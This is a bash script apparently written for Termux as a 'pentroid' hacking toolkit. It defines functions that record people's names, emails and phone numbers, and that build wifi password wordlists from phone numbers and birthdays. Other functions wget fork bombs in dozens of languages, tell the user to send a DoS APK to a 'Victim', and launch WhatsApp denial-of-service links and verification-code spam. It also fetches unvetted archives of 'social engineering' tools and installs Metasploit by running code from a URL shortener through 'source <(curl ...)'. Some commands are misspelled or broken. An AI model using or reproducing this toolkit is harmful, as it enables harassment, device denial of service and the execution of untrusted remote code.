red="\033[0;49;91m"
green="\033[0;49;92m"
yellow="\033[0;49;93m"
dblue="\033[0;49;94m"
violet="\033[0;49;95m"
blue="\033[0;49;96m"
white="\033[0;49;97m"
PS1='\[\e[33m\]ptf > \[\e[0m\] '
bash loading.sh
clear
python chb.py
python essec.py
echo ""
echo "type it > phelp < to view the pentroid options"
namewrt(){
	case "$1" in
		-a | --add)
			echo "NAME: $2" >> LOGS.md
			echo "EMAIL: $3" >> LOGS.md
			echo "PHONE NUMBER: $4" >> LOGS.md
			echo "SOCIAL MEDIA: $5" >> LOGS.md
			echo "NAME $2 ADDED"
			echo "EMAIL $3 ADDED"
			echo "PHONE NUMBER $4 ADDED"
			echo "SOCIAL MEDIA $5 ADDED"
		;;
		-s | --see)
			clear
			echo -e $white "[$red !\033[m\033[m$white ] Viewer-Action"
			cat "LOGS.md"
		;;
		*)
			echo -e $red "namewrt >usage< \n -s / --see : namewrt [ PARAMETER ] \n -a / --add : namewrt [ PARAMETER ] [ NAME ] [ EMAIL ] [ PHONE NUMBER ] [ SOCIAL MEDIA ] \n"
		;;

	esac
}

killwf(){
	echo -e "\033[7;49;91m [ ! ] \033[m \033[4;49;93m This function will not break wifi password with an connection and brute force!\033[m"
	sleep 1
	echo ""
	echo -e "\033[7;49;91m [ ! ] \033[m \033[4;49;93m That will just crate an list with the possible combinations!\033[m"
	case "$1" in
		-p | --phonenumber)
			nohup seq 111111111 1 999999999 >> "$2.txt" &
			echo -e $violet "Use > jobs < to see process in background!"
			
		;;
		-n | --minimum)
			nohup seq 10000000 1 99999999 >> "$2.txt"
			echo -e $violet "Use > jobs < to see process in background!"
		;;
		-m | --max)
			sleep 1
			nohup seq 1000000000000000000000000000000000000000000000000000000000000000 1111 9999999999999999999999999999999999999999999999999999999999999999 >> "$2.txt" &
			sleep 1
			echo -e $violet "Use > jobs < to see process in background!"
		;;
		-b | --birthday)
			request_limit="0"
			while [ "$request_limit" -lt "$2" -o "$request_limit" -gt "$2" ]
			do
				day=$(echo $((1 + SRANDOM % 31)))
				mounth=$(echo $((1 + SRANDOM % 12)))
				year=$(echo $((1300 + SRANDOM % 2024)))
				var=$(echo "$day$mounth$year")
				echo "$var" >> "$3.txt"
				request_limit=$((request_limit+1))
				echo -e $yellow "Senha $request_limit Gerada"
			done
			echo -e $red "MAXIMUM PASSWORDS REACHED!!!"
			sleep 1
			echo -e $violet "Passwords Saved In $3.txt"
		;;
		*)
			echo -e $blue "killwf(kill wifi) > usage < \n \n killwf [ PARAMETER ] [ LOG NAME ] \n \n -b / --birthday [ PASSW LIMIT ] [ ARCHIVE NAME ] \n  -m / --max\n  -n / --minimum\n  -p / --phonenumber \n "
		;;
	esac

}

doshub(){
	case "$1" in
		-fks | --forkbombscript)
			echo -e $red "DoS/Forkbombs Languages!!"
			printed=$(echo -e $green )
			read -p "press enter"
			echo $printed 1 - Ada
			echo $printed 2 - Assembly
			echo $printed 3 - AWK
			echo $printed 4 - Bash
			echo $printed 5 - Batch
			echo $printed 6 - Brainfuck
			echo $printed 7 - C
			echo $printed 8 - C++
			echo $printed 9 - C#
			echo $printed 10 - C# .Net Core under Linux
			echo $printed 11 - Erlang
			echo $printed 12 - FASM
			echo $printed 13 - Go
			echo $printed 14 - Haskell
			echo $printed 15 - HTML
			echo $printed 16 - Java
			echo $printed 17 - JavaScript
			echo $printed 18 - Lisp
			echo $printed 19 - Lua
			echo $printed 20 - Microsoft Access
			echo $printed 21 - PHP
			echo $printed 22 - Perl
			echo $printed 23 - Python
			echo $printed 24 - R
			echo $printed 25 - Ruby
			echo $printed 26 - Rust
			echo $printed 27 - Scheme
			echo $printed 28 - Shell
			echo $printed 29 - Visual Basic
			case "$2" in
				10 | --netcore) 
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb-netcore.cs
					clear
					ls
				;;
				3 | --forkawk)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.awk
					clear
					ls
				;;
				4 | --bashfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.bash
					clear
					ls
				;;
				5 | --bat)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.bat
					clear
					ls
				;;
				6 | --brainfuck)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.bf
					clear
					ls
				;;
				7 | --Cscript)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.c
					clear
					ls
				;;
				8 | --Cplusplus)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.cc
					clear
					ls
				;;
				9 | --Csharp)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.cs
					clear
					ls
				;;
				11 | --elrfork)
					wget https://github.com/aaronryank/fork-bomb/blob/master/fork-bomb.erl
					clear
					ls
				;;
				12 | --fasmfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.fasm
					clear
					ls
				;;
				13 | --gofork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.go
					clear
					ls
				;;
				14 | --hsfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.hs
					clear
					ls
				;;
				15 | --htmlfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.html
					clear
					ls
				;;
				17 | --jsfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.js
					clear
					ls
				;;
				18 | --lspfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.lsp
					clear
					ls
				;;
				19 | --luafork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.lua
					clear
					ls
				;;
				-20 | --mdbfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.mdb
					clear
					ls
				;;
				21 | --phpfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.php
					clear
					ls
				;;
				22 | --plfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.pl
					clear
					ls
				;;
				23 | --pythonfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.py
					clear
					ls
				;;
				24 | --rfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.r
					clear
					ls
				;;
				25 | --rbfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.rb
					clear
					ls
				;;
				26 | --rsfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.rs
					clear
					ls
				;;
				2 | --sfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.s
					clear
					ls
				;;
				27 | --scmfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.scm
					clear
					ls
#-sh IS DIFERENT OF -bsh!!!
				;;
				28 | --shfork) 
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.sh
					clear
					ls
				;;
				29 | --vbsfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.vbs
					clear
					ls
				;;
				1 | --adbfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/forkbomb.adb
					clear
					ls
				;;
				16 | --javascriptfork)
					wget https://raw.githubusercontent.com/aaronryank/fork-bomb/master/forkbomb.java
					clear
					ls
				;;
				*)
					echo -e $white "-fks >usage< \n \n doshub -fks [ FORK BOMB NUMBER ] \n \033[m"
					echo -e $red "THE FORK BOMB WILL BE SAVED IN THE CURRENT DIRECTORY!! "
				;;

			esac
		;;
		-a | --apk)
			echo -e $violet "Send the apk in DoSAndroid.7z to your\033[m$red Victim\033[m"
			read -p "Press enter to install."
			am start -a android.intent.action.VIEW -d https://www.mediafire.com/file/y7riootxrwfra68/DoS_Manual.7z/file?dkey=z7pql1ikc0u
		;;
		-wa | --whatsappdos)
			case "$2" in
				-old | --olddos)
					am start -a android.intent.action.VIEW -d https://wa.me//"$3"?text=wa.me//settings
				;;
				-new | --newdos)
					echo -e $red "Spam the number in\033[m$green Whatsapp Business\033[m$red with\033[m$green Verification Codes \033[m"
				;;
				*)
					echo -e $violet "-wa >usage< \n \n -old / --olddos [ PHONE NUMBER ] \n -new / --newdos \n"
				;;
			esac
		;;
		*)
			echo -e $red "DoSHub >usage< \n doshub [ PARAMETER ] \n \n -wa / --whatsappdos \n -a / --apk \n -fks / --forkbombscript \n "
		;;

	esac

}
bannershow(){
	for i in $(seq 1 1 3)
	do
		clear ; cat banners/banr1.txt ; sleep 0.09 ; clear ; cat banners/baner1.txt ; sleep 0.09 ; clear ; cat banners/banner1.txt 
		sleep 0.09
	done

}
NetHome(){
	case "$1" in 
		-n | --nmap)
			echo -e $dblue "THIS NetWork SCAN CAN TAKE A WHILE!!"
			read -p "press enter to continue"
			exho -e "\033[m"
			echo -e $yellow "If the scan not show the connected ips, try again."
			read -p "press enter to continue"
			bannershow
			echo -e "\033[m"
			txt=$(nmap "$2/24")
			HOST=$(echo ${txt:84} | cut -d" " -f1)
			DEVICE1=$(echo ${txt:84} | cut -d" " -f30-30)
			DEVICE2=$(echo ${txt:84} | cut -d" " -f57-57)
			DEVICE3=$(echo ${txt:84} | cut -d" " -f94-94)
			echo -e $red "The Host: $HOST\033[m"
			echo ""
			echo -e $green "Device1: $DEVICE1 \n"
			echo -e $green "Device2: $DEVICE2 \n"
			echo -e $green "Device3: $DEVICE3 \n"
		;;
		-ntk | --networkapks)
			echo -e $green "USE\033[m$red ZARCHIVER\033[m$green To extract the NetWorking Tools"
			read -p "press enter to install"
			am start -a android.intent.action.VIEW -d https://www.mediafire.com/file/khejy1qetzrei78/Networking_Scanners.7z/file?dkey=zu00qtlhwhw&r=1971
		;;
		-sh | --showdevices)
			echo -e $green "In this website you can search for devices connected at wifi!\033[m"
			read -p "press enter to go on website"
			am start -a android.intent.action.VIEW -d https://www.shodan.io/
		;;
		-pry | --privacyapps)
			echo -e $green "USE\033[m$red ZARCHIVER\033[m$green To extract the Privacy Tools"
			read -p "press anter to install apps 4 privacy!"
			am start -a android.intent.action.VIEW -d https://www.mediafire.com/file/197jxb49wr8p5jp/Privacy_Appks.7z/file?dkey=q9dgqqs44sm&r=842
		;;
		*)
			echo -e "NetHome >usage< \n \n Ex: NetHome [ PARAMETER ] \n -n / --scan, scan Ex: NetHome -n [ YOUR ROUTTER IP ] \n -ntk / --networkapps \n -sh / --showdevices \n -pry / --privacyapps \n"

		;;
	esac
}

quit(){
	cd /data/data/com.termux/files/usr/etc ; source bash.bashrc ; cd
}
CodeZploit(){
	case "$1" in 
		-exp | --exploit)
			read -p "Do you want to install Metasploit? (this is take an space of your disk.)" rsp
			if [ "$rsp" = "y" ]
			then
				echo -e $red "Installing..."
				sleep 1
				source <(curl -fsSL https://kutt.it/msf) ; cd $HOME ; am start -a android.intent.action.VIEW -d https://docs.metasploit.com/
			else
				echo -e $red "good\033[m $green boy\033[m"
			fi
		;;
		-expdb | --exploitdatabases)
			echo -e $yellow "In that session you will visit some links, that will help you with a Pententer!"
			read -p "press enter to go in website 1 or CTRL + C to stop"
			am start -a android.intent.action.VIEW -d https://www.exploit-db.com/
			read -p "press enter to go in website 2"
			am start -a android.intent.action.VIEW -d https://www.vulnhub.com/
			read -p "press enter to go in website 3"
			am start -a android.intent.action.VIEW -d https://tryhackme.com/r/onboarding
			read -p "at last press enter to go in the final website."
			echo -e "\033[m"
			echo -e $ $red "JUST KIDDIN XD\033[m"
		;;
		-cdex | --codezploit)
			user=$(whoami)
			echo -e $green "Hello $whoami !" 
			read -p "press enter to start downloading tools or CTRL + C to exit."
			am start -a android.intent.action.VIEW -d https://www.mediafire.com/file/m5dxccrlmn1nur4/Programming_Apps.7z/file?dkey=1bdbxxfq91p&r=1267
			read -p "press enter to install Social Engineering Apks"
			am start -a androis.intent.action.VIEW -d https://www.mediafire.com/file/yprnofdciqbb5bq/Social_Engineering_Tools.7z/fil?dkey=c423e7qnlsb&r=1031
		;;
		*)
			echo -e $yellow "CodeZploit >usage< \n \n Ex: CodeZploit [ PARAMETER ] \n -exp / --exploit \n -expd / --exploitdatabases \n -cdex / --codezploit \n"
			
			
			
			
		;;
			
	esac
}
